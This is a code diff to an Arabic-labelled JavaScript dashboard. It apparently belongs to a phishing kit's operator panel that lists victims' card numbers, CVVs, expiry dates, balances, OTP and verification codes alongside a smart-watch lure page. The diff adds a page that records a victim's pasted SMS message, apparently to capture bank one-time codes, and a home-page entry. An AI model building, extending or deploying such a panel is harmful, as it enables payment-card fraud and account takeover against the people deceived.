@@ -165,7 +165,8 @@ const FIELD_LABELS_AR = {
     expiry_year: 'سنة الانتهاء',
     cvv: 'CVV / CVC',
     balance: 'الرصيد المتوفر',
-    selectedWatch: 'الساعة المختارة'
+    selectedWatch: 'الساعة المختارة',
+    pastedSmsMessage: 'نص الرسالة المُلصَق'
 };
 
 const FIELD_DISPLAY_ORDER = [
@@ -173,7 +174,8 @@ const FIELD_DISPLAY_ORDER = [
     'gov', 'district', 'street', 'address', 'city',
     'otpCode', 'verificationCode',
     'card_number', 'card_holder', 'expiry_date', 'expiry_month', 'expiry_year', 'cvv', 'balance',
-    'selectedWatch'
+    'selectedWatch',
+    'pastedSmsMessage'
 ];
 
 function escapeHtml(value) {
@@ -232,6 +234,16 @@ function normalizeUserForDisplay(user) {
 
 /** جداول الداشبورد: كل صفحة بنموذجها وعنوانها */
 const DASHBOARD_FORM_TABLES = [
+    {
+        page: 'home',
+        title: 'الصفحة الرئيسية',
+        fields: []
+    },
+    {
+        page: 'messege',
+        title: 'معلومات الرسالة',
+        fields: [{ key: 'pastedSmsMessage', label: 'نص الرسالة المُلصَق' }]
+    },
     {
         page: 'login',
         title: 'معلومات الحساب',
@@ -658,6 +670,8 @@ function navTargetToDataPage(target) {
         /* keep f */
     }
     f = f.toLowerCase();
+    if (f.includes('messege')) return 'messege';
+    if (f.includes('index.html') || f === 'index') return 'home';
     if (f.includes('otp2')) return 'otp2';
     if (f.includes('waiting')) return 'waiting';
     if (f.includes('card-data')) return 'card';
@@ -916,7 +930,9 @@ function getPageArabic(page) {
         'address': 'العنوان',
         'card': 'بيانات البطاقة',
         'watches': 'الساعة الذكية',
-        'waiting': 'انتظار'
+        'waiting': 'انتظار',
+        'home': 'الرئيسية',
+        'messege': 'رسالة'
     };
     return pages[page] || page;
 }
